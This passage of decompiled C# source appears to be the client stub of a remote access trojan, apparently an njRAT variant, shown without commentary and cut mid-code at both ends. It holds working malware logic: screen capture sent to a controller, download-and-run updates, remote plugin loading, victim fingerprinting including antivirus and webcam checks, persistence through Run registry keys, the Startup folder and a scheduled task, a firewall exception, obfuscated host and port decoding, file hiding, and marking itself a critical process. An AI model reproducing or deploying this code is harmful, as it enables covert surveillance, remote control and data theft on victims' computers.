            Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, targetRect.Height, PixelFormat.Format16bppRgb555);
            Graphics g = Graphics.FromImage((Image) bitmap1);
            Size size = new Size(bitmap1.Width, bitmap1.Height);
            g.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
            try
            {
              size = new Size(32, 32);
              targetRect = new Rectangle(Cursor.Position, size);
              Cursors.Default.Draw(g, targetRect);
            }
            catch (Exception ex8)
            {
              ProjectData.SetProjectError(ex8);
              Exception ex9 = ex8;
              ProjectData.SetProjectError(ex9);
              ProjectData.SetProjectError(ex9);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
            g.Dispose();
            Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
            Graphics graphics = Graphics.FromImage((Image) bitmap2);
            graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
            graphics.Dispose();
            MemoryStream memoryStream1 = new MemoryStream();
            string S = "CAP" + Stub.OK.j.OK.Y;
            b = Stub.OK.j.OK.SB(ref S);
            memoryStream1.Write(b, 0, b.Length);
            MemoryStream memoryStream2 = new MemoryStream();
            bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
            string Left7 = Stub.OK.j.OK.md5(memoryStream2.ToArray());
            if (Operators.CompareString(Left7, Stub.OK.j.OK.lastcap, false) != 0)
            {
              Stub.OK.j.OK.lastcap = Left7;
              memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
            }
            else
              memoryStream1.WriteByte((byte) 0);
            Stub.OK.j.OK.Sendb(memoryStream1.ToArray());
            memoryStream1.Dispose();
            memoryStream2.Dispose();
            bitmap1.Dispose();
            bitmap2.Dispose();
          }
          else if (Operators.CompareString(Left6, "un", false) == 0)
          {
            string Left8 = strArray1[1];
            if (Operators.CompareString(Left8, "~", false) == 0)
              Stub.OK.j.OK.UNS();
            else if (Operators.CompareString(Left8, "!", false) == 0)
            {
              Stub.OK.j.OK.pr(0);
              ProjectData.EndApp();
            }
            else
            {
              if (Operators.CompareString(Left8, "@", false) != 0)
                return;
              Stub.OK.j.OK.pr(0);
              Process.Start(Stub.OK.j.OK.LO.FullName);
              ProjectData.EndApp();
            }
          }
          else if (Operators.CompareString(Left1, "up", false) == 0)
          {
            byte[] bytes;
            if (strArray1[1][0] == '\u001F')
            {
              try
              {
                MemoryStream memoryStream = new MemoryStream();
                int length = (strArray1[0] + Stub.OK.j.OK.Y).Length;
                memoryStream.Write(b, length, checked (b.Length - length));
                bytes = Stub.OK.j.OK.ZIP(memoryStream.ToArray());
              }
              catch (Exception ex10)
              {
                ProjectData.SetProjectError(ex10);
                Exception ex11 = ex10;
                ProjectData.SetProjectError(ex11);
                ProjectData.SetProjectError(ex11);
                Stub.OK.j.OK.Send("MSG" + Stub.OK.j.OK.Y + "Update ERROR");
                Stub.OK.j.OK.Send("bla");
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                return;
              }
            }
            else
            {
              WebClient webClient = new WebClient();
              try
              {
                bytes = webClient.DownloadData(strArray1[1]);
              }
              catch (Exception ex12)
              {
                ProjectData.SetProjectError(ex12);
                Exception ex13 = ex12;
                ProjectData.SetProjectError(ex13);
                ProjectData.SetProjectError(ex13);
                Stub.OK.j.OK.Send("MSG" + Stub.OK.j.OK.Y + "Update ERROR");
                Stub.OK.j.OK.Send("bla");
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                ProjectData.ClearProjectError();
                return;
              }
            }
            Stub.OK.j.OK.Send("bla");
            string str12 = str9 + ".exe";
            try
            {
              Stub.OK.j.OK.Send("MSG" + Stub.OK.j.OK.Y + "Updating To " + new FileInfo(str12).Name);
              Thread.Sleep(2000);
              System.IO.File.WriteAllBytes(str12, bytes);
              Process.Start(str12, "..");
            }
            catch (Exception ex14)
            {
              ProjectData.SetProjectError(ex14);
              Exception ex15 = ex14;
              ProjectData.SetProjectError(ex15);
              Exception ex16 = ex15;
              ProjectData.SetProjectError(ex16);
              Exception exception = ex16;
              Stub.OK.j.OK.Send("MSG" + Stub.OK.j.OK.Y + "Update ERROR " + exception.Message);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              return;
            }
            Stub.OK.j.OK.UNS();
          }
          else if (Operators.CompareString(Left1, "Ex", false) == 0)
          {
            if (Stub.OK.j.OK.PLG == null)
            {
              Stub.OK.j.OK.Send("PLG");
              int num = 0;
              while (!(Stub.OK.j.OK.PLG != null | num == 20 | !Stub.OK.j.OK.Cn))
              {
                checked { ++num; }
                Thread.Sleep(1000);
              }
              if (Stub.OK.j.OK.PLG == null | !Stub.OK.j.OK.Cn)
                return;
            }
            object[] Arguments = new object[1]{ (object) b };
            bool[] CopyBack = new bool[1]{ true };
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.PLG))), (System.Type) null, "ind", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
            if (!CopyBack[0])
              return;
            b = (byte[]) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Arguments[0]))))))), typeof (byte[]));
          }
          else
          {
            if (Operators.CompareString(Left1, "PLG", false) != 0)
              return;
            MemoryStream memoryStream = new MemoryStream();
            int length = (strArray1[0] + Stub.OK.j.OK.Y).Length;
            memoryStream.Write(b, length, checked (b.Length - length));
            Stub.OK.j.OK.PLG = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.Plugin(Stub.OK.j.OK.ZIP(memoryStream.ToArray()), "A"))))))));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.PLG))), (System.Type) null, "H", new object[1]
            {
              (object) Stub.OK.j.OK.H
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.PLG))), (System.Type) null, "P", new object[1]
            {
              (object) Stub.OK.j.OK.P
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.PLG))), (System.Type) null, "c", new object[1]
            {
              (object) Stub.OK.j.OK.C
            }, (string[]) null, (System.Type[]) null);
          }
        }
      }
      catch (Exception ex17)
      {
        ProjectData.SetProjectError(ex17);
        Exception ex18 = ex17;
        ProjectData.SetProjectError(ex18);
        Exception ex19 = ex18;
        ProjectData.SetProjectError(ex19);
        Exception exception = ex19;
        if (strArray1.Length > 0)
        {
          if (Operators.CompareString(strArray1[0], "Ex", false) == 0 | Operators.CompareString(strArray1[0], "PLG", false) == 0)
            Stub.OK.j.OK.PLG = (object) null;
        }
        try
        {
          Stub.OK.j.OK.Send("ER" + Stub.OK.j.OK.Y + strArray1[0] + Stub.OK.j.OK.Y + exception.Message);
        }
        catch (Exception ex20)
        {
          ProjectData.SetProjectError(ex20);
          Exception ex21 = ex20;
          ProjectData.SetProjectError(ex21);
          ProjectData.SetProjectError(ex21);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static string inf()
    {
      string str1 = "ll" + Stub.OK.j.OK.Y;
      string str2;
      try
      {
        if (Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.GTV("vn", (object) "")))), (object) "", false))
        {
          string str3 = str1;
          string s = Stub.OK.j.OK.DEB(ref Stub.OK.j.OK.VN) + "_" + Stub.OK.j.OK.HWD();
          string str4 = Stub.OK.j.OK.ENB(ref s);
          string y = Stub.OK.j.OK.Y;
          str2 = str3 + str4 + y;
        }
        else
        {
          string str5 = str1;
          string s1 = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.GTV("vn", (object) "")))));
          string s2 = Stub.OK.j.OK.DEB(ref s1) + "_" + Stub.OK.j.OK.HWD();
          string str6 = Stub.OK.j.OK.ENB(ref s2);
          string y = Stub.OK.j.OK.Y;
          str2 = str5 + str6 + y;
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        string str7 = str1;
        string s = Stub.OK.j.OK.HWD();
        string str8 = Stub.OK.j.OK.ENB(ref s);
        string y = Stub.OK.j.OK.Y;
        str2 = str7 + str8 + y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str9;
      try
      {
        str9 = str2 + Environment.MachineName + Stub.OK.j.OK.Y;
      }
      catch (Exception ex3)
      {
        ProjectData.SetProjectError(ex3);
        Exception ex4 = ex3;
        ProjectData.SetProjectError(ex4);
        ProjectData.SetProjectError(ex4);
        str9 = str2 + "??" + Stub.OK.j.OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str10;
      try
      {
        str10 = str9 + Environment.UserName + Stub.OK.j.OK.Y;
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        Exception ex6 = ex5;
        ProjectData.SetProjectError(ex6);
        ProjectData.SetProjectError(ex6);
        str10 = str9 + "??" + Stub.OK.j.OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str11;
      try
      {
        str11 = str10 + Stub.OK.j.OK.LO.LastWriteTime.Date.ToString("yy-MM-dd") + Stub.OK.j.OK.Y;
      }
      catch (Exception ex7)
      {
        ProjectData.SetProjectError(ex7);
        Exception ex8 = ex7;
        ProjectData.SetProjectError(ex8);
        ProjectData.SetProjectError(ex8);
        str11 = str10 + "??-??-??" + Stub.OK.j.OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str12 = str11 + "" + Stub.OK.j.OK.Y;
      string str13;
      try
      {
        str13 = str12 + Stub.OK.j.OK.F.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
      }
      catch (Exception ex9)
      {
        ProjectData.SetProjectError(ex9);
        Exception ex10 = ex9;
        ProjectData.SetProjectError(ex10);
        ProjectData.SetProjectError(ex10);
        str13 = str12 + "??";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str14 = str13 + "SP";
      string str15;
      try
      {
        string[] strArray = Strings.Split(Environment.OSVersion.ServicePack);
        if (strArray.Length == 1)
          str14 += "0";
        str15 = str14 + strArray[checked (strArray.Length - 1)];
      }
      catch (Exception ex11)
      {
        ProjectData.SetProjectError(ex11);
        Exception ex12 = ex11;
        ProjectData.SetProjectError(ex12);
        ProjectData.SetProjectError(ex12);
        str15 = str14 + "0";
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str16;
      try
      {
        str16 = !Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") ? str15 + " x86" + Stub.OK.j.OK.Y : str15 + " x64" + Stub.OK.j.OK.Y;
      }
      catch (Exception ex13)
      {
        ProjectData.SetProjectError(ex13);
        Exception ex14 = ex13;
        ProjectData.SetProjectError(ex14);
        ProjectData.SetProjectError(ex14);
        str16 = str15 + Stub.OK.j.OK.Y;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      string str17 = (!Stub.OK.j.OK.Cam() ? str16 + "No" + Stub.OK.j.OK.Y : str16 + "Yes" + Stub.OK.j.OK.Y) + Stub.OK.j.OK.GetAntiVirus() + Stub.OK.j.OK.Y + Stub.OK.j.OK.GetAntiVirus() + Stub.OK.j.OK.Y + Stub.OK.j.OK.GetAntiVirus() + Stub.OK.j.OK.Y;
      string str18 = "";
      try
      {
        string[] valueNames = Stub.OK.j.OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + Stub.OK.j.OK.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string str19 = valueNames[index];
          if (str19.Length == 32)
            str18 = str18 + str19 + ",";
          checked { ++index; }
        }
      }
      catch (Exception ex15)
      {
        ProjectData.SetProjectError(ex15);
        Exception ex16 = ex15;
        ProjectData.SetProjectError(ex16);
        ProjectData.SetProjectError(ex16);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str17 + str18;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void INS()
    {
      Thread.Sleep(1000);
      if (Stub.OK.j.OK.Idr)
      {
        if (!Stub.OK.j.OK.CompDir(Stub.OK.j.OK.LO, new FileInfo(Interaction.Environ(Stub.OK.j.OK.DR).ToLower() + "\\" + Stub.OK.j.OK.EXE.ToLower())))
        {
          try
          {
            if (System.IO.File.Exists(Interaction.Environ(Stub.OK.j.OK.DR) + "\\" + Stub.OK.j.OK.EXE))
              System.IO.File.Delete(Interaction.Environ(Stub.OK.j.OK.DR) + "\\" + Stub.OK.j.OK.EXE);
            FileStream fileStream = new FileStream(Interaction.Environ(Stub.OK.j.OK.DR) + "\\" + Stub.OK.j.OK.EXE, FileMode.CreateNew);
            byte[] array = System.IO.File.ReadAllBytes(Stub.OK.j.OK.LO.FullName);
            fileStream.Write(array, 0, array.Length);
            fileStream.Flush();
            fileStream.Close();
            Stub.OK.j.OK.LO = new FileInfo(Interaction.Environ(Stub.OK.j.OK.DR) + "\\" + Stub.OK.j.OK.EXE);
            Process.Start(Stub.OK.j.OK.LO.FullName);
            ProjectData.EndApp();
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Exception ex2 = ex1;
            ProjectData.SetProjectError(ex2);
            ProjectData.SetProjectError(ex2);
            ProjectData.EndApp();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
      }
      try
      {
        Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
      }
      catch (Exception ex3)
      {
        ProjectData.SetProjectError(ex3);
        Exception ex4 = ex3;
        ProjectData.SetProjectError(ex4);
        ProjectData.SetProjectError(ex4);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("Hassan firewall add allowedprogram \"" + Stub.OK.j.OK.LO.FullName + "\" \"" + Stub.OK.j.OK.LO.Name + "\" ENABLE", AppWinStyle.Hide, true, 5000);
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        Exception ex6 = ex5;
        ProjectData.SetProjectError(ex6);
        ProjectData.SetProjectError(ex6);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      if (Stub.OK.j.OK.RegistrySt)
      {
        try
        {
          Stub.OK.j.OK.F.Registry.CurrentUser.OpenSubKey(Stub.OK.j.OK.sf, true).SetValue(Stub.OK.j.OK.RG, (object) ("\"" + Stub.OK.j.OK.LO.FullName + "\" .."));
        }
        catch (Exception ex7)
        {
          ProjectData.SetProjectError(ex7);
          Exception ex8 = ex7;
          ProjectData.SetProjectError(ex8);
          ProjectData.SetProjectError(ex8);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          Stub.OK.j.OK.F.Registry.LocalMachine.OpenSubKey(Stub.OK.j.OK.sf, true).SetValue(Stub.OK.j.OK.RG, (object) ("\"" + Stub.OK.j.OK.LO.FullName + "\" .."));
        }
        catch (Exception ex9)
        {
          ProjectData.SetProjectError(ex9);
          Exception ex10 = ex9;
          ProjectData.SetProjectError(ex10);
          ProjectData.SetProjectError(ex10);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Stub.OK.j.OK.IsF == Conversions.ToBoolean("True"))
      {
        try
        {
          System.IO.File.Copy(Stub.OK.j.OK.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Stub.OK.j.OK.xDlol1 + ".exe", true);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        if (Operators.CompareString(Stub.OK.j.OK.Task, "True", false) == 0)
        {
          string file = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "/Server.exe";
          MyProject.Computer.FileSystem.WriteAllBytes(file, System.IO.File.ReadAllBytes(Application.ExecutablePath), true);
          Interaction.Shell("schtasks /create /sc minute /mo 1 /tn Server /tr " + file, AppWinStyle.Hide);
          Thread.Sleep(10000);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (!Conversions.ToBoolean(Stub.OK.j.OK.Hide))
        return;
      System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void ko()
    {
      if (Interaction.Command() != null)
      {
        if (Operators.CompareString(Stub.OK.j.OK.Sleep, "True", false) == 0)
          Thread.Sleep(checked ((int) Math.Round(Math.Round(unchecked (Conversions.ToDouble(Stub.OK.j.OK.Sleep1) * 1000.0)))));
        if (Operators.CompareString(Stub.OK.j.OK.HP, "True", false) == 0)
        {
          Stub.OK.j.OK.H = Encoding.UTF8.GetString(Convert.FromBase64String(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Stub.OK.j.OK.H, "विनी", "M"), "!", "="), "蒂", "T"), "मे", "A"), "बीपी", "Z")));
          Stub.OK.j.OK.P = Encoding.UTF8.GetString(Convert.FromBase64String(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Stub.OK.j.OK.P, "粹", "M"), "ता", "T"), "의도", "A"), "에", "e")));
        }
        try
        {
          Stub.OK.j.OK.F.Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          Exception ex2 = ex1;
          ProjectData.SetProjectError(ex2);
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(5000);
      }
      bool createdNew = false;
      Stub.OK.j.OK.MT = (object) new Mutex(true, Stub.OK.j.OK.RG, out createdNew);
      if (!createdNew)
        ProjectData.EndApp();
      Stub.OK.j.OK.INS();
      if (!Stub.OK.j.OK.Idr)
      {
        Stub.OK.j.OK.EXE = Stub.OK.j.OK.LO.Name;
        Stub.OK.j.OK.DR = Stub.OK.j.OK.LO.Directory.Name;
      }
      try
      {
        NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue((object) new Thread(new ThreadStart(Stub.OK.j.OK.RC), 1)), (System.Type) null, "Start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      catch (Exception ex3)
      {
        ProjectData.SetProjectError(ex3);
        Exception ex4 = ex3;
        ProjectData.SetProjectError(ex4);
        ProjectData.SetProjectError(ex4);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      int num = 0;
      string Left = "";
      if (Stub.OK.j.OK.BD)
      {
        try
        {
          SystemEvents.SessionEnding += new SessionEndingEventHandler(Stub.OK.j.OK.ImHere);
          Stub.OK.j.OK.pr(1);
        }
        catch (Exception ex5)
        {
          ProjectData.SetProjectError(ex5);
          Exception ex6 = ex5;
          ProjectData.SetProjectError(ex6);
          ProjectData.SetProjectError(ex6);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      while (true)
      {
        Thread.Sleep(1000);
        if (!Stub.OK.j.OK.Cn)
          Left = "";
        Application.DoEvents();
        try
        {
          checked { ++num; }
          if (num == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch (Exception ex7)
            {
              ProjectData.SetProjectError(ex7);
              Exception ex8 = ex7;
              ProjectData.SetProjectError(ex8);
              ProjectData.SetProjectError(ex8);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          if (num >= 8)
          {
            num = 0;
            string Right = Stub.OK.j.OK.ACT();
            if (Operators.CompareString(Left, Right, false) != 0)
            {
              Left = Right;
              Stub.OK.j.OK.Send("act" + Stub.OK.j.OK.Y + Right);
            }
          }
          if (Stub.OK.j.OK.RegistrySt)
          {
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.F.Registry.CurrentUser.GetValue(Stub.OK.j.OK.sf + "\\" + Stub.OK.j.OK.RG, (object) "")))), (object) ("\"" + Stub.OK.j.OK.LO.FullName + "\" .."), false))
                Stub.OK.j.OK.F.Registry.CurrentUser.OpenSubKey(Stub.OK.j.OK.sf, true).SetValue(Stub.OK.j.OK.RG, (object) ("\"" + Stub.OK.j.OK.LO.FullName + "\" .."));
            }
            catch (Exception ex9)
            {
              ProjectData.SetProjectError(ex9);
              Exception ex10 = ex9;
              ProjectData.SetProjectError(ex10);
              ProjectData.SetProjectError(ex10);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.F.Registry.LocalMachine.GetValue(Stub.OK.j.OK.sf + "\\" + Stub.OK.j.OK.RG, (object) "")))), (object) ("\"" + Stub.OK.j.OK.LO.FullName + "\" .."), false))
                Stub.OK.j.OK.F.Registry.LocalMachine.OpenSubKey(Stub.OK.j.OK.sf, true).SetValue(Stub.OK.j.OK.RG, (object) ("\"" + Stub.OK.j.OK.LO.FullName + "\" .."));
            }
            catch (Exception ex11)
            {
              ProjectData.SetProjectError(ex11);
              Exception ex12 = ex11;
              ProjectData.SetProjectError(ex12);
              ProjectData.SetProjectError(ex12);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex13)
        {
          ProjectData.SetProjectError(ex13);
          Exception ex14 = ex13;
          ProjectData.SetProjectError(ex14);
          ProjectData.SetProjectError(ex14);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
    }

    public static string md5(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string str = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }

    [DllImport("ntdll")]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int index1 = 0;
      while (index1 < modules.Length)
      {
        Module module = modules[index1];
        System.Type[] types = module.GetTypes();
        int index2 = 0;
        while (index2 < types.Length)
        {
          System.Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
            return module.Assembly.CreateInstance(type.FullName);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      return (object) null;
    }

    public static void pr(int i)
    {
      try
      {
        Stub.OK.j.OK.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static void RC()
    {
      while (true)
      {
        Stub.OK.j.OK.lastcap = "";
        if (Stub.OK.j.OK.C != null)
        {
          long num1 = -1;
          int num2 = 0;
          try
          {
            while (true)
            {
              do
              {
                checked { ++num2; }
                if (num2 == 10)
                {
                  num2 = 0;
                  Thread.Sleep(1);
                }
                if (Stub.OK.j.OK.Cn)
                {
                  if (Stub.OK.j.OK.C.Available < 1)
                    Stub.OK.j.OK.C.Client.Poll(-1, SelectMode.SelectRead);
                  do
                  {
                    if (Stub.OK.j.OK.C.Available > 0)
                    {
                      if (num1 == -1L)
                      {
                        string str = "";
                        while (true)
                        {
                          int CharCode = Stub.OK.j.OK.C.GetStream().ReadByte();
                          switch (CharCode)
                          {
                            case -1:
                              goto label_20;
                            case 0:
                              goto label_11;
                            default:
                              str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                              continue;
                          }
                        }
label_11:
                        num1 = Conversions.ToLong(str);
                        if (num1 == 0L)
                        {
                          Stub.OK.j.OK.Send("");
                          num1 = -1L;
                        }
                      }
                      else
                        goto label_15;
                    }
                    else
                      goto label_20;
                  }
                  while (Stub.OK.j.OK.C.Available > 0);
                  continue;
label_15:
                  Stub.OK.j.OK.b = new byte[checked (Stub.OK.j.OK.C.Available + 1 - 1 + 1 - 1 + 1)];
                  long num3 = checked (num1 - Stub.OK.j.OK.MeM.Length);
                  if ((long) Stub.OK.j.OK.b.Length > num3)
                    Stub.OK.j.OK.b = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1 - 1 + 1)];
                  int count = Stub.OK.j.OK.C.Client.Receive(Stub.OK.j.OK.b, 0, Stub.OK.j.OK.b.Length, SocketFlags.None);
                  Stub.OK.j.OK.MeM.Write(Stub.OK.j.OK.b, 0, count);
                }
                else
                  goto label_20;
              }
              while (Stub.OK.j.OK.MeM.Length != num1);
              num1 = -1L;
              Thread thread = new Thread(new ParameterizedThreadStart(Stub.OK.j.OK.HassanAmiri), 1);
              thread.Start((object) Stub.OK.j.OK.MeM.ToArray());
              thread.Join(100);
              Stub.OK.j.OK.MeM.Dispose();
              Stub.OK.j.OK.MeM = new MemoryStream();
            }
          }
          catch (Exception ex1)
          {
            ProjectData.SetProjectError(ex1);
            Exception ex2 = ex1;
            ProjectData.SetProjectError(ex2);
            ProjectData.SetProjectError(ex2);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
        }
label_20:
        do
        {
          try
          {
            if (Stub.OK.j.OK.PLG != null)
            {
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Stub.OK.j.OK.PLG))), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              Stub.OK.j.OK.PLG = (object) null;
            }
          }
          catch (Exception ex3)
          {
            ProjectData.SetProjectError(ex3);
            Exception ex4 = ex3;
            ProjectData.SetProjectError(ex4);
            ProjectData.SetProjectError(ex4);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          Stub.OK.j.OK.Cn = false;
        }
        while (!Stub.OK.j.OK.connect());
        Stub.OK.j.OK.Cn = true;
      }
    }

    public static string RN(int c)
    {
      VBMath.Randomize();
      Random random = new Random();
      string str1 = "";
      string str2 = "abcdefghijklmnopqrstuvwxyz";
      int num1 = c;
      int num2 = 1;
      while (num2 <= num1)
      {
        str1 += Conversions.ToString(str2[random.Next(0, str2.Length)]);
        checked { ++num2; }
      }
      return str1;
    }

    public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);

    public static bool Send(string S) => Stub.OK.j.OK.Sendb(Stub.OK.j.OK.SB(ref S));

    public static bool Sendb(byte[] b)
    {
      if (!Stub.OK.j.OK.Cn)
        return false;
      try
      {
        lock (Stub.OK.j.OK.LO)
        {
          if (!Stub.OK.j.OK.Cn)
            return false;
          MemoryStream memoryStream = new MemoryStream();
          string S = b.Length.ToString() + "\0";
          byte[] buffer = Stub.OK.j.OK.SB(ref S);
          memoryStream.Write(buffer, 0, buffer.Length);
          memoryStream.Write(b, 0, b.Length);
          Stub.OK.j.OK.C.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        try
        {
          if (Stub.OK.j.OK.Cn)
          {
            Stub.OK.j.OK.Cn = false;
            Stub.OK.j.OK.C.Close();
          }
        }
        catch (Exception ex3)
        {
          ProjectData.SetProjectError(ex3);
          Exception ex4 = ex3;
          ProjectData.SetProjectError(ex4);
